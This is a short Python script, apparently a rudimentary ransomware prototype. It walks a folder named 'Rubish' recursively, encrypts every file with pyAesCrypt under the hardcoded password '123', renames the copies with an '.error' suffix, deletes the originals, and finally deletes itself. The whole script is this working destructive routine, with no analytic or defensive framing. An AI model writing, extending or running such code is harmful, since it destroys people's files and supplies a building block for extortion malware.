import os, sys
import pyAesCrypt
def crypt(file):
    print("----------------------------------------------------------------------")

    password = '123'
    BUFFER_SIZE = 512 * 1024

    pyAesCrypt.encryptFile(str(file), str(file)+".error", password, BUFFER_SIZE)
    print("[crypted] '" + str(file)+".error'")

    os.remove(file)


def WALK(dir):
    for name in os.listdir(dir):
        
        path = os.path.join(dir, name)

        if os.path.isfile(path):
            crypt(path)
        else:
            WALK(path)


WALK("Rubish")
print("----------------------------------------------------------------------")
os.remove(str(sys.argv[0]))

